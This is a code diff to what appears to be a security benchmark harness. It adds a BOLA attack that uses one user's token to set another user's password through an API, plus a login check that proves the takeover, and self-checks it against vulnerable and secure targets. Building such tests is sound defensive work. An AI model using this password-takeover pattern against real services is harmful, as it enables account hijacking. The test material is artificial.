@@ -79,6 +79,24 @@ def victim_canary_oracle(response: Response, expected_secret: str) -> bool:
     return response.body.get("secret") == expected_secret
 
 
+def set_password(base: str, token: str, username: str, new_password: str) -> Response:
+    """The BOLA-sensitive write action: set another user's password."""
+    return _call("PUT", f"{base}/users/v1/{username}/password", token=token,
+                 payload={"password": new_password})
+
+
+def password_readback_oracle(base: str, username: str, new_password: str) -> bool:
+    """Privileged write oracle.
+
+    Confirms an unauthorized write only when the victim can log in with the
+    password the attacker set. The HTTP status of the write request is a clue,
+    and the login is the proof.
+    """
+    r = _call("POST", f"{base}/users/v1/login",
+              payload={"username": username, "password": new_password})
+    return "auth_token" in r.body
+
+
 def build_bola_instance(base: str, seed_tag: str) -> dict:
     """Set up one BOLA scenario instance and return the public facts plus the
     privileged ground truth needed to score it."""
@@ -97,10 +115,21 @@ def build_bola_instance(base: str, seed_tag: str) -> dict:
 
 
 if __name__ == "__main__":
-    # Self-check: prove the matched pair behaves as claimed.
-    for base, name, expect_leak in ((VULN_BASE, "VULN", True), (SECURE_BASE, "SECURE", False)):
-        inst = build_bola_instance(base, f"selfcheck{int(time.time())%1000}")
+    # Self-check: prove both targets behave as claimed on each configuration.
+    for base, name, expect in ((VULN_BASE, "VULN", True), (SECURE_BASE, "SECURE", False)):
+        tag = f"selfcheck{int(time.time())%1000}"
+
+        # read target: outsider reads the victim's book
+        inst = build_bola_instance(base, tag)
         resp = read_book(base, inst["attacker_token"], inst["victim_title"])
         leaked = victim_canary_oracle(resp, inst["canary"])
-        ok = leaked == expect_leak
-        print(f"{name:6s} status={resp.status} leaked={leaked} expected={expect_leak} -> {'OK' if ok else 'FAIL'}")
+        r_ok = leaked == expect
+        print(f"{name:6s} READ  status={resp.status} disclosed={leaked} expected={expect} -> {'OK' if r_ok else 'FAIL'}")
+
+        # write target: outsider sets the victim's password, confirmed by login
+        victim = f"victim_{tag}"
+        new_pw = f"HACKED-{tag}"
+        set_password(base, inst["attacker_token"], victim, new_pw)
+        changed = password_readback_oracle(base, victim, new_pw)
+        w_ok = changed == expect
+        print(f"{name:6s} WRITE status={'n/a':>3} changed={changed} expected={expect} -> {'OK' if w_ok else 'FAIL'}")
